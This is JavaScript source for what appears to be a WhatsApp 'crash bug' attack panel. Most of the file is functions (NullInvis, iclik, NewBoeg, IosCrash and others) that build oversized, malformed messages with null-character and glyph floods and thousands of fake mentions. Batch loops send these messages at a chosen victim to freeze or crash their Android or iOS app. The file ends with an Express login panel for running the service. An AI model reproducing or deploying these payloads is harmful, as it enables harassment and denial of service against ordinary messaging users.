const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { text: "@HayasiXDandadan By Lanz là ai vậy??", format: "DEFAULT" },
          nativeFlowResponseMessage: {
            name: "hayashi_message",
            paramsJson: "\u0000".repeat(1000000),
            version: 3
          },
          contextInfo: {
            mentionedJid: [
              "13135550002@s.whatsapp.net",
              ...Array.from({ length: 7000 }, () =>
                `1${Math.floor(Math.random() * 10000)}@s.whatsapp.net`
              )
            ],
            externalAdReply: {
              quotedAd: {
                advertiserName: "ꦾꦾ".repeat(60000),
                mediaType: "IMAGE",
                jpegThumbnail: null,
                caption: `@Lanz${"ꦾꦾ".repeat(60000)}`
              },
              placeholderKey: {
                remoteJid: "0s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890"
              }
            }
          }
        }
      }
    }
  }, {});
  
  const msg9 = {
    ephemeralMessage: {
      message: {
        extendedTextMessage: {
          text: "\u0000\u200b\u2060\u202e" + "𑇂𑆵𑆴𑆿".repeat(10000), 
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 900 },
                () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              ),
            ],
            remoteJid: "status@broadcast",
            participant: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
            stanzaId: "123",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              },
              forwardedAiBotMessageInfo: {
                botName: null,
                botJid: `${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`,
                creatorName: "Lanz là ai vậy??"
              }
            }
          },
        }
      }
    }
  };
  
  await sock.relayMessage(target, stxview, {
    messageId: null,
    participant: { jid: target },
    userJid: target,
  });
  await sock.relayMessage(target, stxview, {
    messageId: null,
    participant: { jid: target },
    userJid: target,
  });
 }
}

async function NullInvis(sock, target, count) {
for (let i = 0; i < count; i++) {
  let msg = await generateWAMessageFromContent(target, {
  viewOnceMessage: {
   message: {
    interactiveResponseMessage: {
      header: {
          title: '</𖥂 𝘿𝙭𝙮𝙫𝙭𝙯 𝘾𝙤𝙧𝙥𝙤𝙧𝙖𝙩𝙞𝙤𝙣 𖥂\\>',
          locationMessage: {
             degreesLatitude: 999999999,
             degreesLongitude: -999999999,
             name: '{'.repeat(100000),
             address: '{'.repeat(100000)
          }
      },
      body: {
        text: "D | DxyVxZ-Exploration",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
        version: 3
      },
      contextInfo: {
        mentionedJid: Array.from({ length:2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
      }
    }
   }
 }
}, { userJid:target });

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target, "13135550002@s.whatsapp.net"],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
 }
}

async function iclik(sock, target) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              participant: target,
              mentionedJid: Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              ),
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400
                },
              },
            },
            body: {
              text: "⏤͟͟͞͞𝐗⏤͟͟͞͞𝐀⏤͟͟͞͞𝐍⏤͟͟͞͞𝐆⏤͟͟͞͞𝐄⏤͟͟͞͞𝐋" + "ោ៝".repeat(20000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            stickerMessage: {
              url: "https://mmg.whatsapp.net/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0&mms3=true",
              fileSha256: "ljadeB9XVTFmWGheixLZRJ8Fo9kZwuvHpQKfwJs1ZNk=",
              fileEncSha256: "D0X1KwP6KXBKbnWvBGiOwckiYGOPMrBweC+e2Txixsg=",
              mediaKey: "yRF/GibTPDce2s170aPr+Erkyj2PpDpF2EhVMFiDpdU=",
              mimetype: "application/was",
              height: 512,
              width: 512,
              directPath: "/v/t62.15575-24/567293002_1345146450341492_7431388805649898141_n.enc?ccb=11-4&oh=01_Q5Aa2wGWTINA0BBjQACmMWJ8nZMZSXZVteTA-03AV_zy62kEUw&oe=691B041A&_nc_sid=5e03e0",
              fileLength: "14390",
              mediaKeyTimestamp: "1760786856",
              isAnimated: true,
              stickerSentTs: "1760786855983",
              isAvatar: false,
              isAiSticker: false,
              isLottie: true,
            },
          },
        },
      },
    },
    {}
  );
  
  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  console.log(chalk.red(`Succes Sending Bug!`));
}

// BATAS FUNC GACOR DXY

const mediaData = [
  {
    ID: "68917910",
    uri: "t62.43144-24/10000000_2203140470115547_947412155165083119_n.enc?ccb=11-4&oh",
    buffer: "11-4&oh=01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe",
    sid: "5e03e0",
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
    ENCSHA256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
    mkey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
  },
  {
    ID: "68884987",
    uri: "t62.43144-24/10000000_1648989633156952_6928904571153366702_n.enc?ccb=11-4&oh",
    buffer: "B01_Q5Aa1wH1Czc4Vs-HWTWs_i_qwatthPXFNmvjvHEYeFx5Qvj34g&oe",
    sid: "5e03e0",
    SHA256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
    ENCSHA256: "25fgJU2dia2Hhmtv1orOO+9KPyUTlBNgIEnN9Aa3rOQ=",
    mkey: "lAMruqUomyoX4O5MXLgZ6P8T523qfx+l0JsMpBGKyJc=",
  },
];

let sequentialIndex = 0;

async function NewBoeg(sock, objective) {

const selectedMedia = mediaData[sequentialIndex];

  sequentialIndex = (sequentialIndex + 1) % mediaData.length;

  const MD_ID = selectedMedia.ID;
  const MD_Uri = selectedMedia.uri;
  const MD_Buffer = selectedMedia.buffer;
  const MD_SID = selectedMedia.sid;
  const MD_sha256 = selectedMedia.SHA256;
  const MD_encsha25 = selectedMedia.ENCSHA256;
  const mkey = selectedMedia.mkey;

  let parse = true;
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
  
    let Sugandih = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "ោ៝".repeat(10000),
    title: "kopi dangdut",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };
  
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}&mms3=true`,
          fileSha256: MD_sha256,
          fileEncSha256: MD_encsha25,
          mediaKey: mkey,
          mimetype: type,
          directPath: `/v/${MD_Uri}=${MD_Buffer}=${MD_ID}&_nc_sid=${MD_SID}`,
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () => `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                )
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };


  let tmsg = await generateWAMessageFromContent(objective, {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: Math.floor(Math.random() * 99999),
        forwardingScore: 9999,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(10000)
        },
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          )
        ],
        quotedMessage: {
           imageMessage: {
               url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
               mimetype: "image/jpeg",
               caption:"ោ៝".repeat(6000),
               fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
               fileLength: "19769",
               height: 354,
               width: 783,
               mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
               fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
               directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
               mediaKeyTimestamp: "1743225419",
               jpegThumbnail: null,
                scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                scanLengths: [2437, 17332],
                 contextInfo: {
                    isSampled: true,
                    participant: objective,
                    remoteJid: "status@broadcast",
                    forwardingScore: 9999,
                    isForwarded: true
                }
            }         
        },
        annotations: [
          {
            embeddedContent: { Sugandih },
            embeddedAction: true
          }
        ]
      }
    }
  }, {});
  const msg = generateWAMessageFromContent(objective, message, {});
  const msgg = generateWAMessageFromContent(objective, tmsg, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [objective],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: objective },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
 
  await sock.relayMessage("status@broadcast", msgg.message, {
    messageId: msgg.key.id,
    statusJidList: [objective],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: objective },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function Qiwiyz(X) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "EVOLUTION ATTACK" + "ꦾ".repeat(6666),
            },
            footer: {
              text: "Hii",
            },
            contextInfo: {
              participant: X,
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: true 
                  }),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
                {
                  name: "single_select",
                  buttonParamsJson: JSON.stringify({
                    status: "@blek_trot",
                    criador: "@blek_trot",
                    ws: {
                    _eventsCount: 1 * 88888888.8888,
                    },
                  }),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: "@blek_trot",
                    criador: "@blek_trot",
                    ws: {
                    _eventsCount: 1 * 88888888.8888,
                    }, 
                  }),
                },
              ],
              messageParamsJson: "{{".repeat(10000),
            },
          },
        },
      },
    };
    
    let messagee = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "EVOLUTION ATTACK" + "ꦾ".repeat(6666),
            },
            footer: {
              text: "Hii",
            },
            contextInfo: {
              participant: X,
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
              ],
              messageParamsJson: "{{".repeat(10000),
            },
          },
        },
      },
    };

    const pertama = await sock.relayMessage(X, message, {
      messageId: "",
      participant: { jid: X },
      userJid: X,
    });

    const kedua = await sock.relayMessage(X, messagee, {
      messageId: "",
      participant: { jid: X },
      userJid: X,
    });

    await sock.sendMessage(X, {
      delete: {
        fromMe: true,
        remoteJid: X,
        id: pertama,
      }
    });

    await sock.sendMessage(X, { 
      delete: {
        fromMe: true,
        remoteJid: X,
        id: kedua,
      }
    });
  } catch (err) {
    console.error(err);
  }
}

// -------------------( IOS FUNC )------------------------------ \\
const IosCrash = async (X) => {
  try {
    let locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "Xerx" + "𑇂𑆵𑆴𑆿".repeat(15000),
      address: "Xerx" + "𑇂𑆵𑆴𑆿".repeat(5000),
      url: `https://lol.crazyapple.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
    }
    let msg = await generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          locationMessage
        }
      }
    }, {});
    let extendMsg = {
      extendedTextMessage: {
        text: "馃懆馃徔鈥嶐煃� 饾樋谭饾櫄饾櫕饾櫎饾櫑饾櫒谭饾櫈饾櫗饾櫂饾櫎饾櫑饾櫄谭_,-,_ 馃И饾棓谭饾椈饾棻 #谭 饾棪谭饾椀饾椉饾槃饾棦谭饾棾饾棔饾槀饾棿谭 @饾棝谭饾棶饾椊饾暋饾槅饾棖谭饾椉饾椇饾櫌饾槀饾椈饾椂饾榿饾櫘 馃檲\n\n# _ - https://t.me/imevolutiin - _ #",
        matchedText: "https://t.me/imevolutuon",
        description: "鈥硷笍XERX鈥硷笍" + "饝噦饝喌饝喆饝喛".repeat(15000),
        title: "鈥硷笍XERX鈥硷笍" + "饝噦饝喌饝喆饝喛".repeat(15000),
        previewType: "NONE",
        jpegThumbnail: "/9j/4AAQSkZJRg",
        thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
        thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
        thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
        mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
        mediaKeyTimestamp: "1743101489",
        thumbnailHeight: 641,
        thumbnailWidth: 640,
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    }
    let msg2 = await generateWAMessageFromContent(X, {
      viewOnceMessage: {
        message: {
          extendMsg
        }
      }
    }, {});
    await sock.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [X],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: {
              jid: X
            },
            content: undefined
          }]
        }]
      }]
    });
    await sock.relayMessage('status@broadcast', msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [X],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: {
              jid: X
            },
            content: undefined
          }]
        }]
      }]
    });
  } catch (err) {
    console.error(err);
  }
};

// ---------------------------------------------------------------------------\\
async function DelayAndro(totalAttacks, X) {
  const BUGS_PER_BATCH = 30;
  const MAX_BATCHES = 2;
  const MAX_TOTAL = BUGS_PER_BATCH * MAX_BATCHES; // 150

  // Batasi maksimal 150 bug
  const actualTotal = Math.min(totalAttacks, MAX_TOTAL);
  const totalBatches = Math.ceil(actualTotal / BUGS_PER_BATCH);

  let sentCount = 0;
  let currentBatch = 1;

  const sendNext = async () => {
    // Hitung sisa bug di batch ini
    const bugsInThisBatch = Math.min(
      BUGS_PER_BATCH,
      actualTotal - (currentBatch - 1) * BUGS_PER_BATCH
    );

    // Kirim semua bug dalam batch ini (satu per satu)
    for (let i = 0; i < bugsInThisBatch; i++) {
      if (sentCount >= actualTotal) break;

      try {
        NewBoeg(sock, X);
        sentCount++;

        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${sentCount}/${actualTotal} Andro 📟 (Batch ${currentBatch}/${totalBatches})
└────────────────────────┘
`));

        // Delay 200ms antar bug
        await new Promise(r => setTimeout(r, 200));
      } catch (error) {
        console.error(`❌ Error saat mengirim bug ke-${sentCount}: ${error.message}`);
        await new Promise(r => setTimeout(r, 200)); // tetap lanjut
      }
    }

    // Cek apakah sudah selesai
    if (currentBatch >= totalBatches || sentCount >= actualTotal) {
      console.log(chalk.green(`✅ Selesai! Total bug terkirim: ${sentCount}`));
      return;
    }

    // Jeda 5 menit sebelum batch berikutnya
    console.log(chalk.yellow(`⏳ Menunggu 5 menit sebelum batch ${currentBatch + 1}...`));
    await new Promise(r => setTimeout(r, 1 * 60 * 1000));

    currentBatch++;
    sendNext();
  };

  console.log(chalk.blue(`🚀 Memulai serangan: ${actualTotal} bug dalam ${totalBatches} batch`));
  sendNext();
}

// ---------------------------------------------------------------------------\\
async function DelayAndro(totalAttacks, X) {
  const BUGS_PER_BATCH = 30;
  const MAX_BATCHES = 3;
  const MAX_TOTAL = BUGS_PER_BATCH * MAX_BATCHES; // 150

  // Batasi maksimal 150 bug
  const actualTotal = Math.min(totalAttacks, MAX_TOTAL);
  const totalBatches = Math.ceil(actualTotal / BUGS_PER_BATCH);

  let sentCount = 0;
  let currentBatch = 1;

  const sendNext = async () => {
    // Hitung sisa bug di batch ini
    const bugsInThisBatch = Math.min(
      BUGS_PER_BATCH,
      actualTotal - (currentBatch - 1) * BUGS_PER_BATCH
    );

    // Kirim semua bug dalam batch ini (satu per satu)
    for (let i = 0; i < bugsInThisBatch; i++) {
      if (sentCount >= actualTotal) break;

      try {
        NullInvis(sock, X, 1);
        svlzVs(sock, X, 1);
        sentCount++;

        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${sentCount}/${actualTotal} Andro 📟 (Batch ${currentBatch}/${totalBatches})
└────────────────────────┘
`));

        // Delay 200ms antar bug
        await new Promise(r => setTimeout(r, 200));
      } catch (error) {
        console.error(`❌ Error saat mengirim bug ke-${sentCount}: ${error.message}`);
        await new Promise(r => setTimeout(r, 200)); // tetap lanjut
      }
    }

    // Cek apakah sudah selesai
    if (currentBatch >= totalBatches || sentCount >= actualTotal) {
      console.log(chalk.green(`✅ Selesai! Total bug terkirim: ${sentCount}`));
      return;
    }

    // Jeda 5 menit sebelum batch berikutnya
    console.log(chalk.yellow(`⏳ Menunggu 5 menit sebelum batch ${currentBatch + 1}...`));
    await new Promise(r => setTimeout(r, 1 * 60 * 1000));

    currentBatch++;
    sendNext();
  };

  console.log(chalk.blue(`🚀 Memulai serangan: ${actualTotal} bug dalam ${totalBatches} batch`));
  sendNext();
}

// ---------------------------------------------------------------------------\\
async function BlankAndro(totalAttacks, X) {
  const BUGS_PER_BATCH = 30;
  const MAX_BATCHES = 2;
  const MAX_TOTAL = BUGS_PER_BATCH * MAX_BATCHES; // 150

  // Batasi maksimal 150 bug
  const actualTotal = Math.min(totalAttacks, MAX_TOTAL);
  const totalBatches = Math.ceil(actualTotal / BUGS_PER_BATCH);

  let sentCount = 0;
  let currentBatch = 1;

  const sendNext = async () => {
    // Hitung sisa bug di batch ini
    const bugsInThisBatch = Math.min(
      BUGS_PER_BATCH,
      actualTotal - (currentBatch - 1) * BUGS_PER_BATCH
    );

    // Kirim semua bug dalam batch ini (satu per satu)
    for (let i = 0; i < bugsInThisBatch; i++) {
      if (sentCount >= actualTotal) break;

      try {
        CrashViewHys(sock, X, 1);
        sentCount++;

        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${sentCount}/${actualTotal} Andro 📟 (Batch ${currentBatch}/${totalBatches})
└────────────────────────┘
`));

        // Delay 200ms antar bug
        await new Promise(r => setTimeout(r, 200));
      } catch (error) {
        console.error(`❌ Error saat mengirim bug ke-${sentCount}: ${error.message}`);
        await new Promise(r => setTimeout(r, 200)); // tetap lanjut
      }
    }

    // Cek apakah sudah selesai
    if (currentBatch >= totalBatches || sentCount >= actualTotal) {
      console.log(chalk.green(`✅ Selesai! Total bug terkirim: ${sentCount}`));
      return;
    }

    // Jeda 5 menit sebelum batch berikutnya
    console.log(chalk.yellow(`⏳ Menunggu 5 menit sebelum batch ${currentBatch + 1}...`));
    await new Promise(r => setTimeout(r, 1 * 60 * 1000));

    currentBatch++;
    sendNext();
  };

  console.log(chalk.blue(`🚀 Memulai serangan: ${actualTotal} bug dalam ${totalBatches} batch`));
  sendNext();
}
// -------------------------------------------------------------------- //
async function FcClickAndro(totalAttacks, X) {
  const BUGS_PER_BATCH = 30;
  const MAX_BATCHES = 2;
  const MAX_TOTAL = BUGS_PER_BATCH * MAX_BATCHES; // 150

  // Batasi maksimal 150 bug
  const actualTotal = Math.min(totalAttacks, MAX_TOTAL);
  const totalBatches = Math.ceil(actualTotal / BUGS_PER_BATCH);

  let sentCount = 0;
  let currentBatch = 1;

  const sendNext = async () => {
    // Hitung sisa bug di batch ini
    const bugsInThisBatch = Math.min(
      BUGS_PER_BATCH,
      actualTotal - (currentBatch - 1) * BUGS_PER_BATCH
    );

    // Kirim semua bug dalam batch ini (satu per satu)
    for (let i = 0; i < bugsInThisBatch; i++) {
      if (sentCount >= actualTotal) break;

      try {
        iclik(sock, X);
        CrashViewHys(sock, X, 1);
        sentCount++;

        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${sentCount}/${actualTotal} Andro 📟 (Batch ${currentBatch}/${totalBatches})
└────────────────────────┘
`));

        // Delay 200ms antar bug
        await new Promise(r => setTimeout(r, 200));
      } catch (error) {
        console.error(`❌ Error saat mengirim bug ke-${sentCount}: ${error.message}`);
        await new Promise(r => setTimeout(r, 200)); // tetap lanjut
      }
    }

    // Cek apakah sudah selesai
    if (currentBatch >= totalBatches || sentCount >= actualTotal) {
      console.log(chalk.green(`✅ Selesai! Total bug terkirim: ${sentCount}`));
      return;
    }

    // Jeda 5 menit sebelum batch berikutnya
    console.log(chalk.yellow(`⏳ Menunggu 5 menit sebelum batch ${currentBatch + 1}...`));
    await new Promise(r => setTimeout(r, 1 * 60 * 1000));

    currentBatch++;
    sendNext();
  };

  console.log(chalk.blue(`🚀 Memulai serangan: ${actualTotal} bug dalam ${totalBatches} batch`));
  sendNext();
}

// ====================== SERVER SETUP ====================== //

app.use(bodyParser.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json()); // Add JSON body parser

// Check user role permissions
function hasPermission(userRole, requiredRole) {
  if (!userRole) return false;
  if (userRole === ROLES.OWNER) return true;
  return ROLE_HIERARCHY[userRole] >= ROLE_HIERARCHY[requiredRole];
}

// Check if user has management permission
function hasManagementPermission(userRole, permissionType) {
  if (userRole === ROLES.OWNER) return true;
  return ROLE_PERMISSIONS[userRole]?.[permissionType] || false;
}

// Login form HTML
const loginFormHTML = (msg = "") => `
<div id="loginFormContainer" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.95); z-index: 1000; justify-content: center; align-items: center; padding: 20px;">
  <div style="background: rgba(0, 0, 0, 0.85); border: 2px solid #f2f2f2; padding: 40px 30px; border-radius: 20px; max-width: 450px; width: 100%; box-shadow: 0 0 30px rgba(0, 204, 136, 0.6), 0 0 60px rgba(0, 204, 136, 0.3), inset 0 0 30px rgba(0, 204, 136, 0.1); backdrop-filter: blur(15px); position: relative; animation: containerGlow 3s ease-in-out infinite;">
    <div id="closeLogin" style="position: absolute; top: 15px; right: 15px; width: 35px; height: 35px; border: 2px solid #f2f2f2; border-radius: 50%; background: rgba(0, 204, 136, 0.1); color: #f2f2f2; font-size: 20px; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: all 0.3s ease; z-index: 100;">×</div>
    
    <div style="display: flex; justify-content: center; margin-bottom: 25px; position: relative;">
      <img src="https://cdn.yupra.my.id/yp/q266hzty.jpg" alt="TheVerse Logo" style="width: 100%; max-width: 280px; height: auto; aspect-ratio: 16/9; border-radius: 12px; object-fit: cover; border: 2px solid #f2f2f2; box-shadow: 0 0 25px rgba(0, 204, 136, 0.8), 0 0 50px rgba(0, 204, 136, 0.4); transition: all 0.3s ease; animation: logoFloat 4s ease-in-out infinite;">
    </div>
    
    <h1 style="font-size: 42px; color: #f2f2f2; font-weight: 900; text-align: center; margin-bottom: 10px; text-shadow: 0 0 20px rgba(0, 204, 136, 0.8), 0 0 40px rgba(0, 204, 136, 0.5); letter-spacing: 3px; font-family: 'Orbitron', sans-serif; animation: titlePulse 2s ease-in-out infinite;">THEVERSE</h1>
    <p style="font-size: 14px; color: #f2f2f2; text-align: center; margin-bottom: 30px; opacity: 0.8; letter-spacing: 2px; font-weight: 500; font-family: 'Orbitron', sans-serif;">GATEWAY THROUGH SHADOWS AND FIRE</p>
    
    ${msg ? `<div style="background: rgba(255, 68, 68, 0.1); padding: 12px; border-radius: 8px; margin-bottom: 20px; border-left: 3px solid #ff4444; color: #ff4444; font-size: 14px; text-align: center; font-family: 'Orbitron', sans-serif;">${msg}</div>` : ''}

    <form id="loginForm" method="POST" action="/auth">
      <div style="margin-bottom: 25px; position: relative;">
        <div style="position: relative; display: flex; align-items: center;">
          <i class="fas fa-user" style="position: absolute; left: 15px; color: #f2f2f2; font-size: 18px; z-index: 2; transition: all 0.3s ease;"></i>
          <input type="text" name="username" placeholder="Username" required style="width: 100%; padding: 15px 15px 15px 50px; background: rgba(0, 204, 136, 0.05); border: 2px solid #f2f2f2; border-radius: 10px; color: #ffffff; font-size: 16px; font-family: 'Orbitron', sans-serif; transition: all 0.3s ease; outline: none;">
        </div>
      </div>
      
      <div style="margin-bottom: 25px; position: relative;">
        <div style="position: relative; display: flex; align-items: center;">
          <i class="fas fa-key" style="position: absolute; left: 15px; color: #f2f2f2; font-size: 18px; z-index: 2; transition: all 0.3s ease;"></i>
          <input type="password" name="key" placeholder="API Key" required style="width: 100%; padding: 15px 15px 15px 50px; background: rgba(0, 204, 136, 0.05); border: 2px solid #f2f2f2; border-radius: 10px; color: #ffffff; font-size: 16px; font-family: 'Orbitron', sans-serif; transition: all 0.3s ease; outline: none;">
        </div>
      </div>
      
      <button type="submit" style="width: 100%; padding: 15px; background: linear-gradient(135deg, #f2f2f2, #00ffaa); border: none; border-radius: 10px; color: #000000; font-size: 18px; font-weight: 900; font-family: 'Orbitron', sans-serif; cursor: pointer; transition: all 0.3s ease; letter-spacing: 3px; box-shadow: 0 0 20px rgba(0, 204, 136, 0.6), 0 4px 15px rgba(0, 204, 136, 0.4); position: relative; overflow: hidden;">
        <i class="fas fa-sign-in-alt"></i> LOGIN
      </button>
    </form>
  </div>
</div>
`;

// Main page HTML
const mainPageHTML = (isLoggedIn = false, username = '', role = '', message = '') => `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TheVerse | Login Panel</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Orbitron', sans-serif;
    }
    
    body {
      background: #000000;
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      padding: 20px;
      position: relative;
      overflow: hidden;
    }
    
    #particleCanvas {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 1;
      pointer-events: none;
    }
    
    .container {
      background: rgba(0, 0, 0, 0.85);
      border: 2px solid #f2f2f2;
      padding: 40px 30px;
      border-radius: 20px;
      max-width: 450px;
      width: 100%;
      box-shadow: 
